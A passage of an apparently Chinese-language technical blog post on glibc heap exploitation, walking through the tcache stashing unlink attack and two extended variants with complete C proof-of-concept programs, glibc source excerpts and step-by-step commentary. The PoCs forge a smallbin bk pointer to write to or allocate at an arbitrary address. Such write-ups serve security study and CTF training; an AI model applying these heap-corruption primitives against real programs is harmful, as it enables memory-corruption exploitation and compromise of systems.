class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\n&quot;</span>, &amp;victim, victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>, t1<span class="number">-0x60</span>*<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, the victim&#x27;s value is changed to a big number\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在这里放入六个chunk到tcache内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163011096.png" alt="image-20220224163011096"></p><p>下面几步是将一个size为0x60的chunk放入smallbins当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163104779.png" alt="image-20220224163104779"></p><p>下面进行相同操作把chunk放入smallbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163256971.png" alt="image-20220224163256971"></p><p>接着修改后一个chunk的bk指针为target-0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163837757.png" alt="image-20220224163837757"></p><p>随后用calloc申请一个smallbin当中的chunk让另一个进入tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224164257661.png" alt="image-20220224164257661"></p><p>可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache</p><h3 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h3><p>以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br></pre></td></tr></table></figure><p>这样就导致了我们的smallbin的bk发生了改变</p><p><img src="/images/image-20220224165952567.png" alt="image-20220224165952567"></p><p>再看在glibc当中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack+"></a>tcache stashing unlink attack+</h2><p>根据上面的进一步分析我们继续来heap exploit里面的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;</span>);</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">&amp;victim, s2+<span class="number">0x3d0</span>, t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *r = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">r[<span class="number">0</span>] = <span class="number">0xaa</span>;</span><br><span class="line">r[<span class="number">1</span>] = <span class="number">0xbb</span>;</span><br><span class="line">r[<span class="number">2</span>] = <span class="number">0xcc</span>;</span><br><span class="line">r[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，这里直放入了五个chunk到tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现</p><p><strong>需要注意的是，这里<code>victim[1] = (uint64_t)(&amp;victim);</code>是需要将fake_chunk的bk指针指向任意可写地址！</strong></p><p><img src="/images/image-20220224171340793.png" alt="image-20220224171340793"></p><p>这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk</p><h2 id="tcache-stashing-unlink-attack-1"><a href="#tcache-stashing-unlink-attack-1" class="headerlink" title="tcache stashing unlink attack++"></a>tcache stashing unlink attack++</h2><p>其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">&amp;victim, victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\n&quot;</span>,</span><br><span class="line">&amp;victim2, victim2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\n&quot;</span>);</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">uint64_t</span>)(&amp;victim2)<span class="number">-0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, </span><br><span class="line">victim[<span class="number">0</span>], victim[<span class="number">1</span>], victim[<span class="number">2</span>], victim[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span 